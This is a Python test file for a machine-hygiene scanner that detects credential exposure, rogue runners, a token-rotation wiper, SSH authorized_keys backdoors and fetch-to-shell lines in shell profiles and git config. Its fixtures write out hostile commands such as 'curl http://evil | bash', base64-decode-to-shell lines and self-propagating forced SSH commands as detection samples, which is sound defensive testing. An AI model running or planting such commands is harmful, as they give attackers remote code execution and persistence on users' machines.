#!/usr/bin/env python3
"""Local machine hygiene checks (credentials + VS Code), all mocked — no real probing."""
from __future__ import annotations

import os
import tempfile
import unittest
from pathlib import Path
from unittest import mock

from stayawake.bots.security import hygiene


class TestCredentials(unittest.TestCase):
    def test_keychain_hit_is_a_warning(self):
        with mock.patch.object(hygiene.credentials, "_macos_keychain_has_github", return_value=True), \
             mock.patch.object(hygiene.credentials, "_git_credentials_file_with_github", return_value=None):
            issues = hygiene.check_credentials()
        ids = [i.id for i in issues]
        self.assertIn("cached-github-keychain", ids)
        self.assertTrue(all(i.severity == "warning" for i in issues))

    def test_clean_machine_has_no_credential_issues(self):
        with mock.patch.object(hygiene.credentials, "_macos_keychain_has_github", return_value=False), \
             mock.patch.object(hygiene.credentials, "_git_credentials_file_with_github", return_value=None):
            self.assertEqual(hygiene.check_credentials(), [])

    def test_plaintext_git_credentials_detected(self):
        with tempfile.TemporaryDirectory() as d:
            cred = Path(d) / ".git-credentials"
            cred.write_text("https://x:token@github.com\n", encoding="utf-8")
            with mock.patch.object(hygiene.Path, "home", return_value=Path(d)):
                self.assertEqual(hygiene.credentials._git_credentials_file_with_github(), cred)

    def test_plaintext_remediation_is_wiper_safe(self):
        # The rotation advice must sequence rotation LAST and name the wiper tripwire —
        # never the old unconditional "rotate the exposed token on GitHub" (#1088).
        with mock.patch.object(hygiene.credentials, "_macos_keychain_has_github", return_value=False), \
             mock.patch.object(hygiene.credentials, "_git_credentials_file_with_github",
                               return_value=Path("/home/u/.git-credentials")):
            issues = hygiene.check_credentials()
        rem = next(i.remediation for i in issues if i.id == "git-credentials-plaintext")
        self.assertIn("gh-token-monitor.service", rem)          # names the wiper tripwire
        self.assertIn("Rotate the exposed token LAST", rem)     # rotation is sequenced last
        self.assertNotIn("rotate the exposed token on GitHub", rem)  # old unsafe wording gone


class TestRunnerPersistence(unittest.TestCase):
    def test_installed_runner_is_a_warning(self):
        with mock.patch.object(hygiene.runner, "_installed_runner_dir",
                               return_value=Path("/home/u/actions-runner")), \
             mock.patch.object(hygiene.runner, "_runner_services", return_value=[]):
            issues = hygiene.check_runner_persistence()
        self.assertIn("self-hosted-runner-persistence", [i.id for i in issues])
        self.assertTrue(all(i.severity == "warning" for i in issues))

    def test_registered_service_alone_is_detected(self):
        with mock.patch.object(hygiene.runner, "_installed_runner_dir", return_value=None), \
             mock.patch.object(hygiene.runner, "_runner_services",
                               return_value=["actions.runner.org-repo.host"]):
            ids = [i.id for i in hygiene.check_runner_persistence()]
        self.assertEqual(ids, ["self-hosted-runner-persistence"])

    def test_remediation_is_wiper_safe(self):
        # Must sequence rotation LAST and never tell the user to rotate first — rotating while
        # runner persistence is live can trip the home-dir wiper (#1088 ordering).
        with mock.patch.object(hygiene.runner, "_installed_runner_dir",
                               return_value=Path("/home/u/actions-runner")), \
             mock.patch.object(hygiene.runner, "_runner_services", return_value=[]):
            issues = hygiene.check_runner_persistence()
        self.assertEqual({"self-hosted-runner-persistence"}, {i.id for i in issues})
        for i in issues:
            rem = i.remediation.lower()
            self.assertIn("do not rotate credentials", rem)          # leads with the guardrail
            self.assertIn("rotate credentials last", rem)
            # The rotation ACTION (the LAST 'rotate' — not the "Do NOT rotate" guardrail) is
            # sequenced AFTER isolation: a meaningful ordering check, not a phrase that never appears.
            self.assertLess(rem.index("isolate the host"), rem.rindex("rotate"))

    def test_macos_launchd_runner_is_captured(self):
        # The launchd branch collects actions.runner labels; the wiper is NOT a runner (it's owned
        # by check_persistence), so _runner_services stays runner-only.
        def fake_run(cmd, **kw):
            if cmd[0] == "launchctl":
                return mock.Mock(returncode=0,
                                 stdout="-\t0\tgh-token-monitor\n"
                                        "501\t0\tactions.runner.acme-app.buildbox\n")
            raise FileNotFoundError                       # no systemctl on macOS
        with mock.patch.object(hygiene.subprocess, "run", side_effect=fake_run):
            services = hygiene.runner._runner_services()
        self.assertIn("actions.runner.acme-app.buildbox", services)
        self.assertNotIn("gh-token-monitor", services)    # wiper is not a runner label

    def test_runner_label_matcher_precision(self):
        # A runner label matches; an unrelated label that merely CONTAINS "actions.runner"
        # (a third-party helper) must NOT — the old whole-line substring test over-matched.
        self.assertTrue(hygiene.runner._is_runner_label("actions.runner.acme-app.host"))
        self.assertFalse(hygiene.runner._is_runner_label("gh-token-monitor.service"))
        self.assertFalse(hygiene.runner._is_runner_label("com.vendor.actions.runner-helper"))
        self.assertFalse(hygiene.runner._is_runner_label("com.apple.Spotlight"))

    def test_clean_host_has_no_runner_issue(self):
        with mock.patch.object(hygiene.runner, "_installed_runner_dir", return_value=None), \
             mock.patch.object(hygiene.runner, "_runner_services", return_value=[]):
            self.assertEqual(hygiene.check_runner_persistence(), [])

    def test_runner_persistence_triggers_incident_runbook(self):
        # Host persistence is an INCIDENT_TRIGGER, so render() must lead with the rotate-LAST
        # runbook (a user's reflex on seeing a rogue runner is to rotate — the wiper tripwire).
        issue = hygiene.HygieneIssue("self-hosted-runner-persistence", "warning", "T", "D", "F")
        out = hygiene.render([issue]).lower()
        self.assertIn("rotate last", out)
        self.assertLess(out.index("isolate the host"), out.index("rotate credentials"))

    def test_audit_composes_runner_persistence(self):
        # Regression: audit() is the SINGLE composition site and must include every probe,
        # so a probe added there is never silently dropped by a caller that hand-assembles checks.
        sentinel = hygiene.HygieneIssue("self-hosted-runner-persistence", "warning", "T", "D", "F")
        with mock.patch.object(hygiene, "check_credentials", return_value=[]), \
             mock.patch.object(hygiene, "check_vscode", return_value=[]), \
             mock.patch.object(hygiene, "check_branch_protection", return_value=[]), \
             mock.patch.object(hygiene, "check_persistence", return_value=[]), \
             mock.patch.object(hygiene, "check_runner_persistence", return_value=[sentinel]):
            ids = [i.id for i in hygiene.audit()]
        self.assertIn("self-hosted-runner-persistence", ids)


class TestPersistence(unittest.TestCase):
    """OS-service persistence probe (#1094) — the gh-token-monitor rotation wiper + lookalikes,
    across systemd unit dirs and macOS LaunchAgents/LaunchDaemons. Uses a tempdir as $HOME so no
    real filesystem outside the tempdir is touched (system dirs like /etc are absent → skipped)."""

    def _home_with(self, rel_files):
        d = Path(tempfile.mkdtemp())
        for rel in rel_files:
            p = d / rel
            p.parent.mkdir(parents=True, exist_ok=True)
            p.write_text("", encoding="utf-8")
        return d

    def test_linux_user_unit_named_hit_warns(self):
        d = self._home_with([".config/systemd/user/gh-token-monitor.service"])
        with mock.patch.object(hygiene.Path, "home", return_value=d):
            issues = hygiene.check_persistence()
        self.assertEqual([i.id for i in issues], ["os-service-persistence"])
        self.assertEqual(issues[0].severity, "warning")
        self.assertIn("gh-token-monitor.service", issues[0].detail)

    def test_macos_launchagent_hit_warns(self):
        d = self._home_with(["Library/LaunchAgents/com.gh-token-monitor.plist"])
        with mock.patch.object(hygiene.Path, "home", return_value=d):
            ids = [i.id for i in hygiene.check_persistence()]
        self.assertEqual(ids, ["os-service-persistence"])

    def test_lookalike_name_is_detected(self):
        # A lookalike (pattern, not the exact name) still warns given the wiper stakes.
        d = self._home_with([".config/systemd/user/gh-token-watch.service"])
        with mock.patch.object(hygiene.Path, "home", return_value=d):
            issues = hygiene.check_persistence()
        self.assertEqual([i.id for i in issues], ["os-service-persistence"])
        self.assertIn("lookalike", issues[0].detail.lower())

    def test_unrelated_units_are_clean(self):
        d = self._home_with([".config/systemd/user/pipewire.service",
                             "Library/LaunchAgents/com.apple.something.plist"])
        with mock.patch.object(hygiene.Path, "home", return_value=d):
            self.assertEqual(hygiene.check_persistence(), [])

    def test_absent_dirs_are_a_noop(self):
        d = Path(tempfile.mkdtemp())          # empty $HOME, no service dirs at all
        with mock.patch.object(hygiene.Path, "home", return_value=d):
            self.assertEqual(hygiene.check_persistence(), [])

    def test_remediation_sequences_isolate_before_rotate(self):
        d = self._home_with([".config/systemd/user/gh-token-monitor.service"])
        with mock.patch.object(hygiene.Path, "home", return_value=d):
            rem = hygiene.check_persistence()[0].remediation.lower()
        self.assertIn("do not rotate", rem)
        self.assertLess(rem.index("isolate"), rem.rindex("rotate"))   # isolate before rotation action

    def test_os_service_persistence_triggers_incident_runbook(self):
        issue = hygiene.HygieneIssue("os-service-persistence", "warning", "T", "D", "F")
        out = hygiene.render([issue]).lower()
        self.assertIn("rotate last", out)
        self.assertLess(out.index("isolate the host"), out.index("rotate credentials"))

    def test_audit_composes_persistence(self):
        sentinel = hygiene.HygieneIssue("os-service-persistence", "warning", "T", "D", "F")
        with mock.patch.object(hygiene, "check_credentials", return_value=[]), \
             mock.patch.object(hygiene, "check_vscode", return_value=[]), \
             mock.patch.object(hygiene, "check_branch_protection", return_value=[]), \
             mock.patch.object(hygiene, "check_runner_persistence", return_value=[]), \
             mock.patch.object(hygiene, "check_persistence", return_value=[sentinel]):
            ids = [i.id for i in hygiene.audit()]
        self.assertIn("os-service-persistence", ids)


class TestHostArtifacts(unittest.TestCase):
    """Host filesystem drop-file probe (#1100) — ingress tooling / staged data. FP-bounded: a lone
    weak indicator is info, a strong/corroborated set is a warning; both point to rotate-LAST."""

    # ── severity / remediation logic (mock the probe to control the artifact set) ──
    def test_lone_weak_indicator_is_info(self):
        with mock.patch.object(hygiene.host_artifacts, "_host_artifacts", return_value=([], ["~/.node_modules"])):
            issues = hygiene.check_host_artifacts()
        self.assertEqual([(i.id, i.severity) for i in issues], [("host-drop-artifact-weak", "info")])

    def test_weak_indicator_language_is_not_accusatory(self):
        # Honesty (#1220): a lone WEAK indicator must not be described as a "payload" or accuse
        # compromise — existence alone can't tell worm-staging from a manual npm install.
        with mock.patch.object(hygiene.host_artifacts, "_host_artifacts", return_value=([], ["~/.node_modules"])):
            f = hygiene.check_host_artifacts()[0]
        self.assertEqual(f.severity, "info")
        self.assertNotIn("payload", (f.title + " " + f.detail).lower())   # no "payload-created" accusation
        self.assertIn("weak", f.detail.lower())                            # honest about the confidence

    def test_strong_ioc_is_warning(self):
        with mock.patch.object(hygiene.host_artifacts, "_host_artifacts",
                               return_value=(["host$user exfil archive"], [])):
            issues = hygiene.check_host_artifacts()
        self.assertEqual([(i.id, i.severity) for i in issues], [("host-drop-artifacts", "warning")])

    def test_two_weak_indicators_corroborate_to_warning(self):
        with mock.patch.object(hygiene.host_artifacts, "_host_artifacts",
                               return_value=([], ["~/.node_modules", "/tmp/.npm"])):
            issues = hygiene.check_host_artifacts()
        self.assertEqual([i.severity for i in issues], ["warning"])

    def test_clean_host_has_no_issue(self):
        with mock.patch.object(hygiene.host_artifacts, "_host_artifacts", return_value=([], [])):
            self.assertEqual(hygiene.check_host_artifacts(), [])

    def test_remediation_is_rotate_last(self):
        for probe in (([], ["~/.node_modules"]), (["host$user archive"], [])):
            with mock.patch.object(hygiene.host_artifacts, "_host_artifacts", return_value=probe):
                rem = hygiene.check_host_artifacts()[0].remediation.lower()
            # Rotation is sequenced last / after isolation (warning says "LAST"; info "BEFORE
            # rotating") — and the rotation ACTION comes after "isolate", not before it.
            self.assertTrue("rotate credentials last" in rem or "before rotating" in rem)
            self.assertLess(rem.index("isolate"), rem.rindex("rotat"))

    def test_warning_triggers_incident_runbook_but_info_does_not(self):
        warn = hygiene.HygieneIssue("host-drop-artifacts", "warning", "T", "D", "F")
        info = hygiene.HygieneIssue("host-drop-artifact-weak", "info", "T", "D", "F")
        self.assertIn("respond in this order", hygiene.render([warn]).lower())
        self.assertNotIn("respond in this order", hygiene.render([info]).lower())

    # ── detection against a fake $HOME ─────────────────────────────────────────────
    def test_detects_node_modules_as_weak(self):
        d = Path(tempfile.mkdtemp())
        (d / ".node_modules").mkdir()
        with mock.patch.object(hygiene.Path, "home", return_value=d):
            strong, weak = hygiene.host_artifacts._host_artifacts()
        self.assertTrue(any(".node_modules" in w for w in weak))
        self.assertEqual(strong, [])

    def test_detects_host_user_exfil_archive_as_strong(self):
        d = Path(tempfile.mkdtemp())
        tag = hygiene.host_artifacts._host_user_tag()
        (d / (tag + ".tar.gz")).write_text("x", encoding="utf-8")
        with mock.patch.object(hygiene.Path, "home", return_value=d):
            strong, _ = hygiene.host_artifacts._host_artifacts()
        self.assertTrue(any("exfil staging archive" in s for s in strong))

    def test_trufflehog_dir_is_not_flagged_but_binary_is(self):
        # A trufflehog CACHE DIR (legit user) must not hit; a staged trufflehog FILE must.
        d = Path(tempfile.mkdtemp())
        (d / ".cache").mkdir()
        (d / ".cache" / "trufflehog").mkdir()          # legit cache dir
        self.assertIsNone(hygiene.host_artifacts._staged_secret_scanner((d / ".cache",)))
        (d / ".npm").mkdir()
        (d / ".npm" / "trufflehog").write_text("bin", encoding="utf-8")   # staged binary FILE
        self.assertIsNotNone(hygiene.host_artifacts._staged_secret_scanner((d / ".npm",)))

    def test_audit_composes_host_artifacts(self):
        sentinel = hygiene.HygieneIssue("host-drop-artifacts", "warning", "T", "D", "F")
        with mock.patch.object(hygiene, "check_credentials", return_value=[]), \
             mock.patch.object(hygiene, "check_vscode", return_value=[]), \
             mock.patch.object(hygiene, "check_runner_persistence", return_value=[]), \
             mock.patch.object(hygiene, "check_persistence", return_value=[]), \
             mock.patch.object(hygiene, "check_branch_protection", return_value=[]), \
             mock.patch.object(hygiene, "check_host_artifacts", return_value=[sentinel]):
            ids = [i.id for i in hygiene.audit()]
        self.assertIn("host-drop-artifacts", ids)


class TestVSCode(unittest.TestCase):
    def _settings(self, body: str) -> Path:
        f = tempfile.NamedTemporaryFile("w", suffix=".json", delete=False)
        f.write(body)
        f.close()
        return Path(f.name)

    def test_autotasks_on_is_warning(self):
        p = self._settings('{ "task.allowAutomaticTasks": "on" }')
        ids = [i.id for i in hygiene.check_vscode(p)]
        self.assertIn("vscode-autotasks-on", ids)

    def test_autotasks_off_is_clean(self):
        p = self._settings('{ "task.allowAutomaticTasks": "off" }')
        self.assertEqual(hygiene.check_vscode(p), [])

    def test_missing_setting_is_info(self):
        p = self._settings('{ "editor.fontSize": 13 }')
        issues = hygiene.check_vscode(p)
        self.assertEqual([i.id for i in issues], ["vscode-autotasks-default"])
        self.assertEqual(issues[0].severity, "info")

    def test_workspace_trust_disabled_is_warning(self):
        p = self._settings('{ "task.allowAutomaticTasks": "off", '
                           '"security.workspace.trust.enabled": false }')
        ids = [i.id for i in hygiene.check_vscode(p)]
        self.assertIn("vscode-workspace-trust-off", ids)

    def test_no_vscode_settings_is_noop(self):
        # No path given → auto-detect; when VS Code isn't installed it returns None.
        with mock.patch.object(hygiene.editor, "_vscode_user_settings", return_value=None):
            self.assertEqual(hygiene.check_vscode(), [])


class TestSSHAuthorizedKeys(unittest.TestCase):
    """~/.ssh/authorized_keys — the SSH-persistence sink GhostApproval writes to (#1161)."""

    def _home(self, authkeys: str | None = None, dir_mode=0o700, file_mode=0o600):
        d = Path(tempfile.mkdtemp())
        ssh = d / ".ssh"
        ssh.mkdir()
        os.chmod(ssh, dir_mode)
        if authkeys is not None:
            ak = ssh / "authorized_keys"
            ak.write_text(authkeys, encoding="utf-8")
            os.chmod(ak, file_mode)
        return d

    def test_world_writable_ssh_dir_warns(self):
        d = self._home(dir_mode=0o707)
        with mock.patch.object(hygiene.Path, "home", return_value=d):
            ids = [i.id for i in hygiene.check_ssh_authorized_keys()]
        self.assertIn("ssh-dir-writable", ids)

    def test_world_writable_authorized_keys_warns(self):
        d = self._home("ssh-ed25519 AAAAC3Nz me@host\n", file_mode=0o666)
        with mock.patch.object(hygiene.Path, "home", return_value=d):
            ids = [i.id for i in hygiene.check_ssh_authorized_keys()]
        self.assertIn("ssh-authorized-keys-writable", ids)

    def test_backdoor_forced_command_is_warning_and_incident_trigger(self):
        ak = 'command="curl http://x|bash",no-pty ssh-ed25519 AAAAC3Nz attacker@evil\n'
        d = self._home(ak)
        with mock.patch.object(hygiene.Path, "home", return_value=d):
            issues = hygiene.check_ssh_authorized_keys()
        issue = next(i for i in issues if i.id == "ssh-authorized-keys-forced-command")
        self.assertEqual(issue.severity, "warning")
        self.assertIn("ssh-authorized-keys-forced-command", hygiene.INCIDENT_TRIGGER_IDS)
        # remediation is wiper-safe (neutralize before rotate)
        self.assertIn("gh-token-monitor.service", issue.remediation)

    def test_benign_restricted_key_is_info_not_warning(self):
        # A forced command with NO fetch/decode/scratch shape (rsync/borg/git-shell) → info review.
        ak = 'command="/usr/bin/borg serve --restrict-to-path /backup" ssh-ed25519 AAAA bkp@host\n'
        d = self._home(ak)
        with mock.patch.object(hygiene.Path, "home", return_value=d):
            issues = hygiene.check_ssh_authorized_keys()
        self.assertEqual([i.id for i in issues], ["ssh-authorized-keys-restricted"])
        self.assertEqual(issues[0].severity, "info")

    def test_forced_command_scratch_data_arg_is_info(self):
        # FP fix: a scratch path used as a DATA argument (borg/rrsync --restrict-to-path) is NOT a
        # backdoor — only the executable being in a scratch dir is. Must be info, never a warning.
        for ak in ('command="borg serve --restrict-to-path /var/tmp/repo",restrict ssh-ed25519 AAAA b@h\n',
                   'command="rrsync -ro /srv/tmp/pub" ssh-ed25519 AAAA r@h\n'):
            d = self._home(ak)
            with mock.patch.object(hygiene.Path, "home", return_value=d):
                issues = hygiene.check_ssh_authorized_keys()
            self.assertEqual([i.id for i in issues], ["ssh-authorized-keys-restricted"], ak)

    def test_forced_command_executable_in_scratch_warns(self):
        # ...but the forced EXECUTABLE itself living in a scratch dir IS a backdoor.
        d = self._home('command="/tmp/.x/backdoor" ssh-ed25519 AAAA a@e\n')
        with mock.patch.object(hygiene.Path, "home", return_value=d):
            ids = [i.id for i in hygiene.check_ssh_authorized_keys()]
        self.assertIn("ssh-authorized-keys-forced-command", ids)

    def test_command_in_comment_is_info_not_warning(self):
        # Fail-closed whole-line scan reads command="…" even from the trailing comment (so a backdoor on
        # an odd key-type line is never dropped). A benign comment carries no payload → info, not warning.
        d = self._home('ssh-ed25519 AAAAC3Nz my key command="cleanup /tmp/ cache"\n')
        with mock.patch.object(hygiene.Path, "home", return_value=d):
            issues = hygiene.check_ssh_authorized_keys()
        self.assertEqual([(i.id, i.severity) for i in issues],
                         [("ssh-authorized-keys-restricted", "info")])

    def test_cert_key_type_backdoor_is_not_dropped(self):
        # Fail-closed: a forced-command backdoor on a certificate key-type line (unrecognized by any
        # key-type allowlist) must still be flagged, not silently skipped.
        d = self._home('command="/tmp/payload" ssh-ed25519-cert-v01@openssh.com AAAA attacker@evil\n')
        with mock.patch.object(hygiene.Path, "home", return_value=d):
            ids = [i.id for i in hygiene.check_ssh_authorized_keys()]
        self.assertIn("ssh-authorized-keys-forced-command", ids)

    def test_self_propagating_command_is_flagged(self):
        # A worm forced-command that re-adds its own key (contains a key-type substring) then runs a
        # scratch payload must warn — the key-type substring must not derail parsing.
        d = self._home('command="echo ssh-ed25519 AAAA >> ~/.ssh/authorized_keys; /tmp/x"'
                       ' ssh-ed25519 AAAA attacker@evil\n')
        with mock.patch.object(hygiene.Path, "home", return_value=d):
            ids = [i.id for i in hygiene.check_ssh_authorized_keys()]
        self.assertIn("ssh-authorized-keys-forced-command", ids)

    def test_wrapper_and_separator_scratch_exec_warns(self):
        # A scratch executable reached via a wrapper (nohup/env) or after a separator is still a backdoor.
        for ak in ('command="nohup /tmp/payload &" ssh-ed25519 AAAA a@e\n',
                   'command="env X=1 /tmp/payload" ssh-ed25519 AAAA a@e\n'):
            d = self._home(ak)
            with mock.patch.object(hygiene.Path, "home", return_value=d):
                ids = [i.id for i in hygiene.check_ssh_authorized_keys()]
            self.assertIn("ssh-authorized-keys-forced-command", ids, ak)

    def test_plain_keys_are_clean(self):
        ak = ("ssh-ed25519 AAAAC3NzaC1lZDI1 laptop@home\n"
              "ssh-rsa AAAAB3NzaC1yc2E desktop@work\n")
        d = self._home(ak)
        with mock.patch.object(hygiene.Path, "home", return_value=d):
            self.assertEqual(hygiene.check_ssh_authorized_keys(), [])

    def test_no_ssh_dir_is_noop(self):
        d = Path(tempfile.mkdtemp())                 # no ~/.ssh at all
        with mock.patch.object(hygiene.Path, "home", return_value=d):
            self.assertEqual(hygiene.check_ssh_authorized_keys(), [])

    def test_group_writable_is_not_flagged(self):
        # per-user-private-group distros (umask 002) make benign files group-writable — must NOT warn.
        d = self._home("ssh-ed25519 AAAA me@host\n", dir_mode=0o770, file_mode=0o660)
        with mock.patch.object(hygiene.Path, "home", return_value=d):
            self.assertEqual(hygiene.check_ssh_authorized_keys(), [])


class TestShellProfile(unittest.TestCase):
    """Shell startup files — a fetch-to-shell line runs on every new shell (T1546.004)."""

    def _home_with_rc(self, name: str, body: str):
        d = Path(tempfile.mkdtemp())
        (d / name).write_text(body, encoding="utf-8")
        return d

    def test_fetch_pipe_shell_in_zshrc_warns(self):
        d = self._home_with_rc(".zshrc", "export EDITOR=vim\ncurl -fsSL http://evil | bash\n")
        with mock.patch.object(hygiene.Path, "home", return_value=d):
            issues = hygiene.check_shell_profile()
        self.assertEqual([i.id for i in issues], ["shell-profile-fetch-exec"])
        self.assertEqual(issues[0].severity, "warning")
        self.assertIn("shell-profile-fetch-exec", hygiene.INCIDENT_TRIGGER_IDS)

    def test_realistic_rc_with_tool_init_is_clean(self):
        body = (
            '# my zshrc\n'
            'export PATH="$HOME/bin:$PATH"\n'
            'eval "$(rbenv init -)"\n'
            'eval "$(pyenv init -)"\n'
            'eval "$(direnv hook zsh)"\n'
            'eval "$(/opt/homebrew/bin/brew shellenv)"\n'
            'alias ll="ls -la"\n'
            'source ~/.zsh_aliases\n'
            '[ -f ~/.fzf.zsh ] && source ~/.fzf.zsh\n'
        )
        d = self._home_with_rc(".zshrc", body)
        with mock.patch.object(hygiene.Path, "home", return_value=d):
            self.assertEqual(hygiene.check_shell_profile(), [])

    def test_commented_out_line_is_clean(self):
        d = self._home_with_rc(".bashrc", "# curl http://x | bash  (disabled)\n")
        with mock.patch.object(hygiene.Path, "home", return_value=d):
            self.assertEqual(hygiene.check_shell_profile(), [])

    def test_base64_decode_exec_warns(self):
        d = self._home_with_rc(".profile", "echo Zm9v | base64 -d | sh\n")
        with mock.patch.object(hygiene.Path, "home", return_value=d):
            self.assertEqual([i.id for i in hygiene.check_shell_profile()],
                             ["shell-profile-fetch-exec"])

    def test_fetch_pipe_to_data_interpreter_is_clean(self):
        # FP fix: piping a fetch/decode into a data-CONSUMING interpreter (formatter/filter/diff) is
        # data, not exec. JWT decode, API pretty-print, proc-sub into diff, curl|jq, curl|node script.
        body = (
            'alias jwtd="cut -d. -f2 | base64 -d | python3 -m json.tool"\n'
            'alias ipinfo="curl -s ipinfo.io | python3 -m json.tool"\n'
            'alias apidiff="diff <(curl -s http://a) <(curl -s http://b)"\n'
            'curl -s http://x | jq .\n'
            'curl -s http://x | node format.js\n'
        )
        d = self._home_with_rc(".zshrc", body)
        with mock.patch.object(hygiene.Path, "home", return_value=d):
            self.assertEqual(hygiene.check_shell_profile(), [])

    def test_bare_interpreter_pipe_still_warns(self):
        # ...but a BARE interpreter (no program arg) executes stdin as code — still a backdoor.
        d = self._home_with_rc(".bashrc", "curl -fsSL http://evil | python\n")
        with mock.patch.object(hygiene.Path, "home", return_value=d):
            self.assertEqual([i.id for i in hygiene.check_shell_profile()], ["shell-profile-fetch-exec"])

    def test_sourcing_fetch_still_warns(self):
        # A shell/source consumer before <(curl …) IS exec (unlike diff <(curl …)).
        d = self._home_with_rc(".zshrc", "source <(curl -sL http://evil.fish)\n")
        with mock.patch.object(hygiene.Path, "home", return_value=d):
            self.assertEqual([i.id for i in hygiene.check_shell_profile()], ["shell-profile-fetch-exec"])

    def test_stdin_as_script_dash_warns(self):
        # `python -` reads the program from stdin — identical to bare `curl|python`, must warn.
        d = self._home_with_rc(".bashrc", "curl -fsSL http://evil | python -\n")
        with mock.patch.object(hygiene.Path, "home", return_value=d):
            self.assertEqual([i.id for i in hygiene.check_shell_profile()], ["shell-profile-fetch-exec"])

    def test_current_dir_argument_to_scratch_is_clean(self):
        # `.` as the current-dir ARGUMENT (rsync/cp/diff source) into a /tmp destination is not
        # dot-source — must not fire (round-2 FP).
        body = ('alias backup="rsync -a . /tmp/backup"\n'
                'alias snap="cp -r . /var/tmp/snap"\n'
                'alias cmp="diff . /tmp/checkout"\n')
        d = self._home_with_rc(".zshrc", body)
        with mock.patch.object(hygiene.Path, "home", return_value=d):
            self.assertEqual(hygiene.check_shell_profile(), [])

    def test_direct_scratch_execution_warns(self):
        # Running a scratch binary directly (after a separator, or via a wrapper) is a backdoor shape.
        for line in ("true && /tmp/.x/run\n", "nohup /dev/shm/rev &\n", "; env A=1 /tmp/p\n"):
            d = self._home_with_rc(".bashrc", line)
            with mock.patch.object(hygiene.Path, "home", return_value=d):
                self.assertEqual([i.id for i in hygiene.check_shell_profile()],
                                 ["shell-profile-fetch-exec"], line)

    def test_no_rc_files_is_noop(self):
        d = Path(tempfile.mkdtemp())
        with mock.patch.object(hygiene.Path, "home", return_value=d):
            self.assertEqual(hygiene.check_shell_profile(), [])


class TestGitConfigExecution(unittest.TestCase):
    """Global git config that makes git exec an attacker command (T1546)."""

    def _with_config(self, pairs):
        return mock.patch.object(hygiene.mechanism, "_git_global_config", return_value=pairs)

    def test_fsmonitor_command_warns(self):
        with self._with_config([("core.fsmonitor", "/tmp/mon.sh")]):
            issues = hygiene.check_git_config_execution()
        self.assertEqual([i.id for i in issues], ["git-fsmonitor-command"])
        self.assertEqual(issues[0].severity, "warning")

    def test_fsmonitor_boolean_true_is_clean(self):
        with self._with_config([("core.fsmonitor", "true")]):
            self.assertEqual(hygiene.check_git_config_execution(), [])

    def test_hookspath_in_scratch_dir_warns(self):
        with self._with_config([("core.hookspath", "/tmp/hooks")]):
            ids = [i.id for i in hygiene.check_git_config_execution()]
        self.assertEqual(ids, ["git-hookspath-unsafe"])

    def test_hookspath_in_home_is_info(self):
        with self._with_config([("core.hookspath", "/home/u/.githooks")]):
            issues = hygiene.check_git_config_execution()
        self.assertEqual([(i.id, i.severity) for i in issues], [("git-hookspath-set", "info")])

    def test_alias_fetch_exec_warns(self):
        with self._with_config([("alias.sync", "!curl http://x | sh")]):
            ids = [i.id for i in hygiene.check_git_config_execution()]
        self.assertEqual(ids, ["git-config-fetch-exec"])

    def test_benign_config_is_clean(self):
        with self._with_config([("core.pager", "less"), ("core.editor", "vim"),
                                ("alias.st", "status"), ("alias.lg", "log --oneline --graph")]):
            self.assertEqual(hygiene.check_git_config_execution(), [])

    def test_git_absent_is_noop(self):
        def boom(*a, **k):
            raise FileNotFoundError
        with mock.patch.object(hygiene.subprocess, "run", side_effect=boom):
            self.assertEqual(hygiene.mechanism._git_global_config(), [])

    def test_z_framing_parse(self):
        out = "core.pager\0alias.st\nstatus\0core.editor\nvim\0"
        with mock.patch.object(hygiene.subprocess, "run",
                               return_value=mock.Mock(returncode=0, stdout=out)):
            pairs = hygiene.mechanism._git_global_config()
        self.assertEqual(pairs, [("core.pager", ""), ("alias.st", "status"),
                                 ("core.editor", "vim")])

    def test_fsmonitor_external_helper_is_info_not_warning(self):
        # FP fix: a legit external fsmonitor (watchman wrapper) is non-boolean but not a backdoor.
        for helper in ("rs-git-fsmonitor", "/Users/dev/.cargo/bin/rs-git-fsmonitor",
                       ".git/hooks/query-watchman"):
            with self._with_config([("core.fsmonitor", helper)]):
                issues = hygiene.check_git_config_execution()
            self.assertEqual([(i.id, i.severity) for i in issues],
                             [("git-fsmonitor-external", "info")], helper)
        self.assertNotIn("git-fsmonitor-external", hygiene.INCIDENT_TRIGGER_IDS)

    def test_fsmonitor_backdoor_shape_still_warns(self):
        for bad in ("/tmp/mon.sh", "curl -s http://x | bash"):
            with self._with_config([("core.fsmonitor", bad)]):
                ids = [i.id for i in hygiene.check_git_config_execution()]
            self.assertEqual(ids, ["git-fsmonitor-command"], bad)

    def test_fsmonitor_boolean_variants_are_clean(self):
        for v in ("true", "false", "yes", "no", "on", "off", "1", "0", "TRUE"):
            with self._with_config([("core.fsmonitor", v)]):
                self.assertEqual(hygiene.check_git_config_execution(), [], v)

    def test_alias_fetch_to_data_interpreter_is_clean(self):
        with self._with_config([("alias.prjson",
                                 "!curl -s https://api.github.com/user | python -m json.tool")]):
            self.assertEqual(hygiene.check_git_config_execution(), [])

    def test_alias_current_dir_to_scratch_is_clean(self):
        # `.` as the current-dir sync source (not dot-source) into /tmp — round-2 FP, must stay clean.
        with self._with_config([("alias.snapshot", "!rsync -a . /tmp/snap")]):
            self.assertEqual(hygiene.check_git_config_execution(), [])

    def test_alias_scratch_exec_via_bang_sigil_warns(self):
        # A git shell alias runs a scratch payload on `git <alias>` — the `!` sigil must not hide it.
        for v in ("!/tmp/evil.sh", "!bash /tmp/x", "!node /tmp/x.js", "!VERSION=1 /tmp/deploy.sh"):
            with self._with_config([("alias.pwn", v)]):
                self.assertEqual([i.id for i in hygiene.check_git_config_execution()],
                                 ["git-config-fetch-exec"], v)

    def test_credential_helper_scratch_exec_via_bang_warns(self):
        with self._with_config([("credential.helper", "!/tmp/evil")]):
            self.assertEqual([i.id for i in hygiene.check_git_config_execution()],
                             ["git-config-fetch-exec"])

    def test_url_scoped_credential_helper_is_not_evaded(self):
        # A per-URL helper (credential.<url>.helper) execs too — the sub-key variant must not slip.
        with self._with_config([("credential.https://github.com.helper", "!/tmp/evil")]):
            self.assertEqual([i.id for i in hygiene.check_git_config_execution()],
                             ["git-config-fetch-exec"])
        with self._with_config([("credential.https://github.com.helper", "osxkeychain")]):
            self.assertEqual(hygiene.check_git_config_execution(), [])

    def test_benign_bang_aliases_and_helpers_are_clean(self):
        for k, v in [("alias.st", "!git status"), ("alias.visual", "!gitk --all"),
                     ("alias.co", "checkout"),
                     ("credential.helper", "!aws codecommit credential-helper $@"),
                     ("credential.helper", "osxkeychain")]:
            with self._with_config([(k, v)]):
                self.assertEqual(hygiene.check_git_config_execution(), [], f"{k}={v}")

    def test_hookspath_with_tmp_path_segment_is_info(self):
        # A private dir with a 'tmp' path SEGMENT is not the system scratch dir → info, not unsafe.
